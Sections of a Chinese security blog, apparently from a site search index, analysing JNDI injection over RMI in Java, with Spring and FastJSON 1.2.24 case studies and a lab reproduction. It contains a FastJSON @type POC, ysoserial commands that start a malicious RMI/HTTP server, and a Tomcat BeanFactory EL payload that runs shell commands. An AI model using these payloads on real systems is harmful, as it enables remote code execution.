<p>\u90a3\u4e48\u6211\u4eec\u6765\u5177\u4f53\u770b\u4e00\u4e0blookup\u51fd\u6570\u5177\u4f53\u505a\u4e86\u4ec0\u4e48</p> <p>\u9996\u5148InitialContext\u7684lookup\u51fd\u6570\uff0c\u4f1a\u6839\u636e\u63d0\u4f9b\u7684URL\u81ea\u52a8\u9009\u62e9\u5408\u9002\u7684InitialContext\uff08\u5206\u79bb\u51fa\u534f\u8bae\u540e\u8fdb\u884c\u9009\u62e9\uff09\uff0c\u6bd4\u5982\u6b64\u65f6\u7684InitialContext\u4e3armiURLContext</p> <p></p> <p>\u7ee7\u7eed\u8ddf\u8fdb<code>com/sun/jndi/toolkit/url/GenericURLContext.java#lookup</code></p> <p></p> <p>\u8fd9\u91cc\u7684ctx\u4e3aRegistryContext\uff0c\u5c06\u5bf9\u6307\u5b9a\u7684RMI Registry\u83b7\u53d6\u7ed1\u5b9a\u7684obj</p> <p></p> <p>\u83b7\u53d6\u5230\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u5e76\u8c03\u7528decodeObject\u51fd\u6570</p> <p></p> <p>\u5982\u679c\u5f53\u524d\u7684remote\u5bf9\u8c61\u662fRemoteReference\u7c7b\u578b\uff0c\u5219\u8fdb\u4e00\u6b65\u8bf7\u6c42Registry\u83b7\u53d6\u8be5Reference\u7684\u5185\u5bb9\u3002\u5230\u8fd9\u91cc\u4e3a\u6b62\uff0c\u6211\u4eec\u63a5\u4e0b\u6765\u7684\u8bf7\u6c42\u5c31\u540cServer\u7aef\u7684\u5173\u7cfb\u4e0d\u5927\u4e86\uff0cClient\u4f1a\u6839\u636e\u62ff\u5230\u7684Reference\u8bf7\u6c42\u76f8\u5e94\u7684\u670d\u52a1\u5668</p> <p>\u7ee7\u7eed\u8ddf\u8fdbgetObjectInstance</p> <p></p> <p>\u8fd9\u91cc\u4f1a\u7ee7\u7eed\u8c03\u7528NamingManager\u7684getObjectFactoryFromReference\uff0c\u8be5\u51fd\u6570\u5b8c\u6210\u4e86\u5411FactoryURL\u8bf7\u6c42\u5177\u4f53\u7684class\u6587\u4ef6\u7684\u529f\u80fd\u3002</p> <p></p> <p>\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\uff0c\u6839\u636efactoryName\u548ccodebase\u5c06\u8fdc\u7a0b\u8f7d\u5165\u76f8\u5e94\u7684class\u6587\u4ef6(\u8fd9\u91cc\u7684loadClass\u7528\u7684URLClassLoader\u6765\u5b8c\u6210\u4efb\u52a1)</p> <p></p> <p>\u5e76\u5728\u7b2c163\u884c\u5bf9\u8f7d\u5165\u7684obj\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u8fd9\u4e5f\u5c31\u662f\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u628apayload\u5199\u5728\u6784\u9020\u51fd\u6570\u91cc\u3002</p> <p>\u5728\u5229\u7528\u4e2d\uff0clookup\u51fd\u6570\u7684\u53c2\u6570\u5fc5\u987b\u662f\u53ef\u63a7\u7684\uff0c\u6216\u8005\u5229\u7528\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u7684\u65b9\u5f0f\u6765\u5b8c\u6210\uff0c\u6bd4\u5982\u4e0b\u9762\u7684\u4e24\u4e2a\u6848\u4f8b</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/#springjtatransactionmanager","title":"\u6848\u4f8b\u4e00\uff1aSpring\u6846\u67b6\u7684JtaTransactionManager\u7c7b","text":"<p>16\u5e74\u7684\u65f6\u5019Spring\u6846\u67b6\u66b4\u4e86\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u7684\u53ef\u5229\u7528\u70b9JtaTransactionManager\uff0c\u5176\u539f\u7406\u5c31\u662f\u5229\u7528\u4e86JNDI \u53ef\u63a7\u7684lookup\u53c2\u6570\uff08\u8fd9\u91cc\u7684\u53ef\u63a7\u7531\u53cd\u5e8f\u5217\u5316\u6765\u5b8c\u6210\uff09\u3002\u6765\u770b\u4e00\u4e0b\u539f\u7406</p> <p><code>org/springframework/transaction/jta/JtaTransactionManager.java#readObject</code></p> <p></p> <p>\u8fd9\u91cc1230\u884c\u521d\u59cb\u5316\u4e86\u4e00\u4e2ajdni\u7684context\uff0c\u8fd9\u4e2acontext\u5c06\u7528\u4e8e\u540e\u7eed\u7684JNDI lookup</p> <p>\u7ee7\u7eed\u8ddf\u8fdbinitUserTransactionAndTranscationManager</p> <p></p> <p>\u7ee7\u7eed\u8ddf\u8fdblookupUserTransaction</p> <p></p> <p>\u8fd9\u91cc\u6700\u7ec8\u8c03\u7528\u4e86context\u7684lookup\u51fd\u6570\uff0c\u5e76\u4e14\u5176\u53c2\u6570\u4e3auserTransactionName\uff0c\u8fd9\u4e2a\u90e8\u5206\u6211\u4eec\u53ef\u4ee5\u5728\u5e8f\u5217\u5316\u524d\u8fdb\u884c\u6784\u9020\uff0c\u4f8b\u5982\u4e0b\u9762\u7684\u4ee3\u7801(\u66f4\u65b0\u5728\u4e86ysoserial\u7684spring3\u4e0a)</p> <p></p> <p>\u5230\u4e86\u5982\u4eca2020\u5e74\uff0c\u8fd9\u4e2a\u7c7b\u7684\u5229\u7528\u4ecd\u7136\u5b58\u5728\u4e8e\u6700\u65b0\u7248\u7684Spring-tx\u7ec4\u4ef6\u4e0aXD</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/#fastjsonpoc-jdbcrowsetimpl","title":"\u6848\u4f8b\u4e8c\uff1aFastJSON\u53cd\u5e8f\u5217\u5316POC JdbcRowSetImpl\u7c7b","text":"<p>fastjson\u7531\u4e8e<code>@type</code>\u7684\u5b58\u5728\uff0c\u5728\u53d7\u5f71\u54cd\u7684\u7248\u672c\u4e2d\uff0c\u5176\u53ef\u4ee5\u5bf9\u4efb\u610f\u6307\u5b9a\u7684\u5bf9\u8c61\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u6839\u636e\u89c4\u5219\u81ea\u52a8\u8c03\u7528setter/getter\u6765\u8fbe\u5230\u5b9e\u4f8b\u8fd8\u539f\u7684\u76ee\u7684\u3002\u9996\u5148\u6765\u770b\u4e00\u4e0bPOC</p> <pre><code>{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/obj\",\"autoCommit\":true}\n</code></pre> <p>\u8fd9\u91cc\u7684\u5173\u952e\u5728\u4e8eautoCommit\uff0c\u6765\u770b\u4e00\u4e0bJdbcRowSetImpl\u7684setAutoCommit\u51fd\u6570</p> <p></p> <p>\u8fd9\u91cc\u5982\u679cconn\u4e3anull\u7684\u8bdd\uff0c\u4f1a\u8c03\u7528connect\u51fd\u6570\uff0c\u770b\u4e00\u4e0bconnect\u51fd\u6570</p> <p></p> <p>\u770b\u5230\u8fd9\u91cc\u7528JNDI\u8fdb\u884c\u6570\u636e\u5e93\u8fde\u63a5\uff0c\u5e76\u4e14\u7531\u4e8efastjson\u7684\u7279\u6027dataSource\u662f\u53ef\u63a7\u7684\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u63a7\u5236lookup\u7684\u53c2\u6570\uff0c\u5e76\u5411\u6076\u610f\u7684server\u53d1\u8d77JNDI\u8fde\u63a5\u3002\u6839\u636e\u524d\u6587\u8bf4\u7684\u539f\u7406\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u5f97\u4e3b\u673a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/#0x03","title":"0x03 \u73af\u5883\u590d\u73b0","text":"","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/#jrmplistener","title":"\u6539\u9020JRMPListener","text":"<p>\u7531\u4e8eJNDI\u5e95\u5c42\u7528\u7684\u90fd\u662fRMI\u7684\u4e1c\u897f\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u5efa\u7acb\u4e00\u4e2a\u7ed1\u5b9a\u4e86Reference\u7684RMI\u670d\u52a1\uff0c\u53ef\u4ee5\u76f4\u63a5\u6539\u6539JRMPListener\u3002</p> <p>\u5728RMI\u90e8\u5206\u66fe\u7ecf\u5206\u6790\u8fc7JRMPListener\uff0c\u5176\u8fd4\u56de\u4e86ExceptionalReturn\uff0c\u4f7f\u5f97\u6784\u9020\u597d\u7684Exception\u5728Client\u53cd\u5e8f\u5217\u5316\u6267\u884c\u547d\u4ee4\u3002\u800c\u5bf9\u4e8e\u7ed1\u5b9aReference\uff0c\u6211\u4eec\u9700\u8981\u4fee\u6539ExceptionalReturn\u4e3aNormalReturn\u5e76\u5c06payloadObject\u6539\u4e3aReferenceWrapper</p> <p></p> <p>payloadObject\u6539\u4e3aReferenceWrapper</p> <p></p> <p>\u4f46\u662f\u5728\u5b9e\u9645\u6d4b\u8bd5\u65f6\uff0c\u53d1\u73b0Client\u8bf7\u6c42\u540e\u4e0d\u80fd\u5b8c\u5168\u9000\u51fa\u3002\u5176\u5b9e\u6211\u4eec\u4e5f\u53ef\u4ee5\u76f4\u63a5\u7528\u4e0a\u9762\u7684\u4f8b\u5b50</p> <p></p> <p>\u4e0d\u8fc7\u8fd9\u91cc\u5c31\u83b7\u53d6\u4e0d\u5230\u662f\u5426\u6709\u8bbf\u95ee\u8fdb\u6765\uff0c\u6839\u636e\u5b9e\u9645\u7684\u73af\u5883\u53d6\u820d\u5427XD</p> <p>\u6539\u9020\u540e\u7684\u5df2\u66f4\u65b0\u5230github\u4e0a</p> <pre><code>// \u5f00\u542f\u6302\u8f7d\u4e86evil class\u6587\u4ef6\u7684HTTP Server\njava -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.PayloadHTTPServer 80 EvilObj \"open /System/Applications/Calculator.app\"\n\n// \u5f00\u542fRMI Reference Listener\njava -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener 1099 EvilObj http://localhost/\n\n// \u6216\u8005\u4f7f\u7528RMIRefListener2\uff0c\u96c6\u5408\u4e86\u4e0a\u9762\u4e24\u4e2a\u6b65\u9aa4\njava -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 localhost:1099 80 EvilObj \"open /System/Applications/Calculator.app\"\n</code></pre>","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/#fastjson-1224-rce","title":"FastJSON 1.2.24 RCE","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5FastJSON 1.2.24\u7248\u672c\u7684RCE\u4e3a\u4f8b\uff0c\u6765\u8bd5\u9a8cJNDI</p> <p>\u9996\u5148\u5f00\u542f\u4e00\u4e2aevil rmi server</p> <pre><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 host:1099 80 EvilObj \"touch /tmp/success\"\n</code></pre> <p>\u7528vulhub\u7684\u73af\u5883</p> <p></p> <p>\u5728\u670d\u52a1\u5668\u7aef\u4f1a\u63a5\u6536\u5230\u8fde\u63a5</p> <p></p> <p>\u8fdb\u5230docker\u91cc\u53ef\u4ee5\u770b\u5230\u751f\u6210\u4e86success\u6587\u4ef6</p> <p></p>","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/#0x04","title":"0x04 \u540e\u7eed","text":"<p>\u524d\u6587\u7528\u7684\u73af\u5883\u662fJDK8u111\uff0c\u5728\u540e\u7eed\u7684JDK8u113\u4ee5\u53caJDK6u132, JDK7u122\u4e4b\u540e\u589e\u52a0\u4e86\u5bf9\u8fdc\u7a0bcodebase\u7684\u9650\u5236</p> <p>\u7cfb\u7edf\u5c5e\u6027 com.sun.jndi.rmi.object.trustURLCodebase\u3001com.sun.jndi.cosnaming.object.trustURLCodebase \u7684\u9ed8\u8ba4\u503c\u53d8\u4e3afalse\uff0c\u5373\u9ed8\u8ba4\u4e0d\u5141\u8bb8\u4ece\u8fdc\u7a0b\u7684Codebase\u52a0\u8f7dReference\u5de5\u5382\u7c7b\u3002\u5982\u679c\u9700\u8981\u5f00\u542f RMI Registry \u6216\u8005 COS Naming Service Provider\u7684\u8fdc\u7a0b\u7c7b\u52a0\u8f7d\u529f\u80fd\uff0c\u9700\u8981\u5c06\u524d\u9762\u8bf4\u7684\u4e24\u4e2a\u5c5e\u6027\u503c\u8bbe\u7f6e\u4e3atrue\u3002</p> <p>Changelog:</p> <ul> <li>JDK 6u141 http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141</li> <li>JDK 7u131 http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html</li> <li>JDK 8u121 http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html</li> </ul> <p>\u6458\u81eahttps://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</p> <p>\u90a3\u4e48\u5982\u679c\u5b58\u5728\u8fd9\u6837\u4e00\u4e2a\u6f0f\u6d1e\u4f46\u662f\u53c8\u662f\u9ad8\u7248\u672c\u7684JDK\u73af\u5883\uff0c\u8be5\u600e\u4e48\u8fdb\u884cbypass\u5462\uff1f</p> <ol> <li>\u627e\u5230\u4e00\u4e2a\u53d7\u5bb3\u8005\u672c\u5730CLASSPATH\u4e2d\u7684\u7c7b\u4f5c\u4e3a\u6076\u610f\u7684Reference Factory\u5de5\u5382\u7c7b\uff0c\u5e76\u5229\u7528\u8fd9\u4e2a\u672c\u5730\u7684Factory\u7c7b\u6267\u884c\u547d\u4ee4\u3002</li> <li>\u5229\u7528LDAP\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u6076\u610f\u7684\u5e8f\u5217\u5316\u5bf9\u8c61\uff0cJNDI\u6ce8\u5165\u4f9d\u7136\u4f1a\u5bf9\u8be5\u5bf9\u8c61\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u5229\u7528\u53cd\u5e8f\u5217\u5316Gadget\u5b8c\u6210\u547d\u4ee4\u6267\u884c\u3002</li> </ol> <p>\u6458\u81eahttps://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</p> <p>\u4e0a\u9762\u7684\u8fd9\u7bc7\u6587\u7ae0\u63d0\u51fa\u4e86\u4e0a\u9762\u4e24\u79cd\u65b9\u6848\u6765\u8fdb\u884c\u3002</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/#_1","title":"\u5229\u7528\u5e95\u5c42\u534f\u8bae\u5b9e\u73b0\u4e0a\u7684\u6f0f\u6d1e","text":"<p>\u5148\u6765\u8bf4\u4e00\u4e0b\u7b2c\u4e8c\u79cd\uff0c\u8fd9\u91cc\u63d0\u5230\u5229\u7528\u7684\u662fLDAP\uff0c\u8fd9\u90e8\u5206\u6211\u4eec\u540e\u9762\u518d\u8be6\u7ec6\u53d9\u8ff0\uff0c\u5176\u5b9e\u539f\u7406\u8ddfRMI\u7684\u53cd\u5e8f\u5217\u5316\u95ee\u9898\u662f\u4e00\u6837\u7684\u3002</p> <p>\u6211\u5728\u6d45\u8c08Java RMI\u53cd\u5e8f\u5217\u5316\u95ee\u9898\u4e2d\u66fe\u63d0\u5230\u8fc7\uff0cJRMPListener\u5229\u7528\u7684\u662fRMI Client\u5728\u63a5\u6536Exception\u65f6\u53d1\u751f\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u800c\u8fd9\u91cc\u7684JNDI\u5e95\u5c42\u7528\u7684\u4ecd\u7136\u662fRMI\u90a3\u5957(\u5982\u679c\u534f\u8bae\u662fRMI\u7684\u8bdd)\uff0c\u6240\u4ee5\u6211\u4eec\u53d1\u8d77\u4e00\u4e2a\u94fe\u63a5\u5230ysoserial\u7684JRMPListener\u4e5f\u8fd8\u662f\u80fd\u6210\u529f\u5229\u7528\u7684\uff0c\u4e0d\u7ba1\u6709\u6ca1\u6709\u8bbe\u7f6e<code>com.sun.jndi.rmi.object.trustURLCodebase</code>\u4e3atrue\u3002\u5f53\u7136\u5982\u679c\u8981\u5229\u7528\u6210\u529f\uff0c\u53d1\u8d77\u7aef\u5fc5\u987b\u8981\u6709\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6240\u4f9d\u8d56\u7684\u7ec4\u4ef6\u5e76\u4e14\u5408\u9002\u7684JDK\u7248\u672c\u624d\u53ef\u4ee5\u3002</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/#factory","title":"\u5229\u7528\u53ef\u5229\u7528\u7684\u672c\u5730Factory\u5bf9\u8c61","text":"<p>\u7136\u540e\u6211\u4eec\u6765\u7ee7\u7eed\u770b\u770b\u7b2c\u4e00\u79cd\u60c5\u51b5</p> <p>\u5728\u524d\u9762\u5206\u6790NamingManager\u7684getObjectFactoryFromReference\u65f6\uff0c\u6211\u7565\u8fc7\u4e86\u672c\u5730\u7684factory\u7684\u8f7d\u5165\u90e8\u5206\u7684\u4ee3\u7801</p> <p></p> <p>\u8fd9\u91cc\u9996\u5148\u4f1a\u5728\u672c\u5730\u7684CLASSPATH\u91cc\u627e\u8fd9\u4e2afactoryName\uff0c\u5982\u679c\u627e\u5230\u4e86\uff0c\u540e\u7eed\u5c31\u4e0d\u7528\u8fdb\u884c\u8fdc\u7a0b\u52a0\u8f7d\u3002\u6240\u4ee5\u5982\u679c\u672c\u5730\u53ef\u4ee5\u627e\u5230\u4e00\u4e2a\u53ef\u5229\u7528\u7684factory\uff0c\u4e5f\u80fd\u7a81\u7834JNDI\u7684\u8fdc\u7a0b\u52a0\u8f7d\u7684\u9650\u5236\u3002</p> <p>\u524d\u9762\u7684\u6587\u7ae0\u4e2d\u63d0\u5230\u4e86tomcat\uff08\u6216glassfish\uff09\u4e2d\u7684BeanFactory\u7684\u5229\u7528\uff0c\u6765\u5206\u6790\u4e00\u4e0b</p> <p>\u9996\u5148\u5728\u540e\u7eed\u7684\u8c03\u7528\u4e2d\uff0cfactory\u7684getObjectInstance\u51fd\u6570\u5c06\u4f1a\u88ab\u8c03\u7528</p> <pre><code>// ref \u4e3a\u6211\u4eec\u4f20\u5165\u7684Reference \u53ef\u63a7\n// name \u4e3afactory\u7684name\uff0c\u8fd9\u91cc\u5c31\u662f\u6211\u4eec\u81ea\u5df1\u4f2a\u9020\u7684*EvilObj* \u53ef\u63a7\nfactory.getObjectInstance(ref, name, nameCtx, environment);\n</code></pre> <p>\u6765\u770b\u4e00\u4e0bBeanFactory\u4e2dgetObjectInstance\u51fd\u6570\u7684\u5b9e\u73b0\uff0c\u51fd\u6570\u6709\u70b9\u957f\uff0c\u6211\u4eec\u6311\u91cd\u70b9\u770b</p> <pre><code>if (obj instanceof ResourceRef) {\n\n            try {\n\n                Reference ref = (Reference) obj;\n                String beanClassName = ref.getClassName();\n                Class&lt;?&gt; beanClass = null;\n                ClassLoader tcl =\n                    Thread.currentThread().getContextClassLoader();\n                if (tcl != null) {\n                    try {\n                        beanClass = tcl.loadClass(beanClassName);// \u8f7d\u5165\u6307\u5b9aclass\n                    } catch(ClassNotFoundException e) {\n                    }\n                } else {\n                    try {\n                        beanClass = Class.forName(beanClassName);// \u8f7d\u5165\u6307\u5b9aclass\n                    } catch(ClassNotFoundException e) {\n                        e.printStackTrace();\n                    }\n                }\n                // ...\n                // ...\n                Object bean = beanClass.newInstance();// \u5b9e\u4f8b\u5316\n</code></pre> <p>\u5148\u770b\u8fd9\u90e8\u5206\u4ee3\u7801\uff0c\u5f53\u524d\u6211\u4eec\u4f20\u5165\u7684Reference\u5fc5\u987b\u662fResourceRef\u5bf9\u8c61\uff0c\u5e76\u5728\u540e\u7eed\u52a0\u8f7dResourceRef\u7684beanClass\u548cshilihuanewInstance\u8fdb\u884c(\u800c\u8fd9\u91cc\u7684class\u6211\u4eec\u53ef\u4ee5\u5728\u8d4b\u503c\u65f6\u968f\u610f\u6307\u5b9a)\u3002</p> <pre><code>RefAddr ra = ref.get(\"forceString\");\nMap&lt;String, Method&gt; forced = new HashMap&lt;&gt;();\nString value;\n\nif (ra != null) {\n    value = (String)ra.getContent();\n    // ...\n\n    /* Items are given as comma separated list */\n    for (String param: value.split(\",\")) {\n        param = param.trim();\n\n        index = param.indexOf('=');\n        if (index &gt;= 0) {// \u5982\u679c\u5185\u5bb9\u4e2d\u5b58\u5728=\uff0c\u63d0\u53d6=\u540e\u9762\u7684\u5b57\u7b26\u4e32\u4f5c\u4e3a\u51fd\u6570\u540d\n            setterName = param.substring(index + 1).trim();\n            param = param.substring(0, index).trim();\n        } else {\n            setterName = \"set\" +\n                         param.substring(0, 1).toUpperCase(Locale.ENGLISH) +\n                         param.substring(1);\n        }\n        try {\n            forced.put(param,\n                       beanClass.getMethod(setterName, paramTypes));\n        } // ...\n    }\n}\n</code></pre> <p>ReferenceRef\u5b58\u5728\u7740\u53ef\u63a7\u7684\u952e\u503c\u5bf9\u5173\u7cfb\uff0c\u901a\u8fc7<code>get</code>\u51fd\u6570\u83b7\u5f97\uff0c\u5982\u4e0a\u8ff0\u4ee3\u7801<code>ref.get(\"forceString\")</code>\u5c06\u4f1a\u83b7\u5f97forceString\u76f8\u5bf9\u5e94\u7684RefAddr\uff0c\u901a\u8fc7\u8c03\u7528RefAddr\u7684getContent\u51fd\u6570\u5c31\u53ef\u4ee5\u83b7\u5f97forceString\u952e\u5bf9\u5e94\u7684\u503c\u3002</p> <p>\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f53forceString\u5bf9\u5e94\u7684\u5185\u5bb9\u4e2d\u5b58\u5728<code>=</code>\u65f6\uff0c\u5c06\u622a\u53d6<code>=</code>\u540e\u9762\u7684\u5b57\u7b26\u4e32\u4f5c\u4e3a\u540e\u7eed\u8c03\u7528\u7684\u51fd\u6570\u540d\u3002\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u6307\u5b9a\u5f53\u524d\u5bf9\u8c61\u7684\u7c7b\u51fd\u6570\u4e86\u3002force\u952e\u503c\u5bf9\u4e2d\u5c06\u5305\u542b<code>=</code>\u524d\u9762\u7684\u5185\u5bb9\u548c\u76f8\u5e94\u7684Method\u5bf9\u8c61\u3002\u4f8b\u5982<code>test=eval</code>,\u6700\u7ec8\u6211\u4eec\u5c06\u5f97\u5230eval\u7684Method\u5bf9\u8c61</p> <pre><code>Enumeration&lt;RefAddr&gt; e = ref.getAll();\n\nwhile (e.hasMoreElements()) {\n\n    ra = e.nextElement();\n    String propName = ra.getType();\n\n    if (propName.equals(Constants.FACTORY) ||\n        propName.equals(\"scope\") || propName.equals(\"auth\") ||\n        propName.equals(\"forceString\") ||\n        propName.equals(\"singleton\")) {\n        continue;\n    }\n\n    value = (String)ra.getContent();\n\n    Object[] valueArray = new Object[1];\n\n    /* Shortcut for properties with explicitly configured setter */\n    Method method = forced.get(propName);\n    if (method != null) {\n        valueArray[0] = value;\n        try {\n            method.invoke(bean, valueArray);\n        } catch (IllegalAccessException|\n                 IllegalArgumentException|\n                 InvocationTargetException ex) {\n            throw new NamingException\n                (\"Forced String setter \" + method.getName() +\n                 \" threw exception for property \" + propName);\n        }\n        continue;\n    }\n</code></pre> <p><code>ref.getAll</code>\u83b7\u53d6\u4e86\u6240\u6709\u7684RefAddr\uff0c\u5bf9\u4e8e\u975e<code>Constants.FACTORY/scope/auth/forceString/singleton</code>\u4e14\u524d\u6587\u53c8\u83b7\u53d6\u76f8\u5e94\u7684Method\u5bf9\u8c61\u65f6\uff0c\u6211\u4eec\u5c06\u8c03\u7528\u8be5\u5bf9\u8c61\uff0c\u5176\u51fd\u6570\u53c2\u6570\u4e3a\u6b64\u65f6RefAddr\u7684\u5185\u5bb9\u3002\u6bd4\u5982\u5b58\u5728\u4e00\u4e2aRefAddr\u7684type\u4e3a<code>test</code>\uff0c\u5c06\u8c03\u7528\u524d\u9762\u7684<code>eval</code>\u7684Method\u5bf9\u8c61\u3002</p> <p>\u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u5c31\u5b8c\u6210\u4e86\u4e00\u6b21\u53cd\u5c04\u8c03\u7528\uff0c\u6765\u770b\u770bpoc</p> <pre><code>// payload from kingx\nResourceRef ref = new ResourceRef(\n    \"javax.el.ELProcessor\",// bean class\n    null, \"\", \"\",\n    true,\"org.apache.naming.factory.BeanFactory\",// factory class\n    null);\n\nref.add(new StringRefAddr(\"forceString\", \"KINGX=eval\"));// eval\u51fd\u6570Method\u5bf9\u8c61\u5c06\u4f1a\u88ab\u8c03\u7528\nref.add(new StringRefAddr(\"KINGX\",\n    \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\")\" +\n        \".newInstance().getEngineByName(\\\"JavaScript\\\")\" +\n        \".eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](\" +\n        \"['/bin/sh','-c','\"+ command +\"'])\" +\n        \".start()\\\")\"));// eval\u51fd\u6570\u7684\u53c2\u6570\u4e3a\u4e0a\u8ff0\u6267\u884c\u547d\u4ee4\u7684el\u8bed\u53e5\n</code></pre>","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/#0x05","title":"0x05 \u603b\u7ed3","text":"<p>\u524d\u9762\u5bf9JNDI with RMI\u505a\u4e86\u4e00\u4e9b\u7b80\u5355\u7684\u4ecb\u7ecd\uff0c\u5f53\u9047\u5230\u53ef\u63a7\u7684JNDI lookup\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u8d77JNDI\u94fe\u63a5\u5230RMI\u670d\u52a1\u4e0a\uff0c\u5229\u7528JNDI Naming Manager\u7684\u8fdc\u7a0bcodebase\u52a0\u8f7d\u673a\u5236\u8f7d\u5165\u4efb\u610f\u7684bytecodes\u3002</p> <p>\u5f53\u7136\uff0c\u524d\u9762\u7684\u5229\u7528\u65b9\u5f0f\u4ec5\u5728JDK8u113\u3001JDK6u132,\u3001JDK7u122\u7248\u672c\u4e4b\u524d\uff0c\u5982\u679c\u9047\u5230\u4e86\u9ad8\u7248\u672c\u7684JDK\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u672c\u5730CLASSPATH\u4e2d\u53ef\u5229\u7528\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\uff0c\u6216\u8005\u662ftomcat\u73af\u5883\u4e0b\u7684\u53ef\u5229\u7528\u7684ObjectFactory\u3002</p> <p>\u5728\u540e\u7eed\u53ef\u5229\u7528\u7684\u672c\u5730Factory\u8fd9\u4e2a\u601d\u8def\u4e0a\uff0c\u539f\u6587\u4f5c\u8005kingx\u63d0\u51fa\u6216\u8bb8\u5176\u4ed6\u7684\u4e2d\u95f4\u4ef6\u73af\u5883\u4e5f\u53ef\u80fd\u5b58\u5728\u8fd9\u79cd\u53ef\u5229\u7528\u7684ObjectFactory\uff0c\u8fd9\u91cc\u7acb\u4e2aflag\uff0c\u4ee5\u540e\u6709\u7a7a\u4e86\u4e00\u5b9a\u8981\u627e\u627eXD</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/","title":"\u6d45\u8c08Java RMI Registry\u5b89\u5168\u95ee\u9898","text":"","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x00","title":"0x00 \u524d\u8a00","text":"<p>\u672c\u6587\u8bb2\u8ff0\u4e86Java RMI Registry\u76f8\u5173\u7684\u53cd\u5e8f\u5217\u5316\u95ee\u9898\uff0c\u4e3b\u8bb2Registry\uff0c\u540e\u7eed\u8865\u5145\u4e86Client\u7aef\u548cServer\u7aef\u7684\u5229\u7528</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x01","title":"0x01 \u539f\u7406","text":"<p>Java RMI\u6d41\u7a0b\u53ef\u53c2\u80031\uff0c\u51fa\u95ee\u9898\u7684\u4f4d\u7f6e\u5728\u4e8e\uff1a</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#registry-bindrebind","title":"\u60c5\u666f\u4e00\uff1aRegistry \u63a5\u6536bind/rebind\u8bf7\u6c42","text":"<p>\u4eceClient\u63a5\u6536\u5230\u7684bind\u6216rebind\u7684<code>remote obj</code>\uff0c\u5c06\u7531<code>sun/rmi/registry/RegistryImpl_Skel.java#dispatch</code>\u5904\u7406</p> <p>\uff08\u4e0b\u56fe\u4e3aJDK8u141\u4e4b\u524d\u7684\u7248\u672c\u7684\u5b9e\u73b0\uff09</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u83b7\u53d6\u5230\u7684\u5e8f\u5217\u5316\u6570\u636e\u76f4\u63a5\u8c03\u7528\u4e86readObject\u51fd\u6570\uff0c\u5bfc\u81f4\u4e86\u5e38\u89c4\u7684Java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u89e6\u53d1\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u53ea\u9700\u8981\u5199\u4e00\u4e2abind\u6216rebind\u7684\u64cd\u4f5c\uff0c\u5373\u53ef\u653b\u51fb\u5230RMI Registry\u3002</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#bindrebind","title":"\u6ce8\u610f\uff1abind/rebind\u8bf7\u6c42\u7684\u9650\u5236","text":"<p>Registry\u5bf9\u4e8ebind/rebind\u7684\u8bf7\u6c42\uff0c\u4f1a\u53bb\u68c0\u67e5\u8fd9\u4e2a\u8bf7\u6c42\u662f\u5426\u4e3a\u672c\u5730\u8bf7\u6c42\uff0c\u5bf9\u4e8e\u5916\u90e8\u7684\u8bf7\u6c42\uff0cRegistry\u4f1a\u62d2\u7edd\u8be5\u8bf7\u6c42\u3002</p> 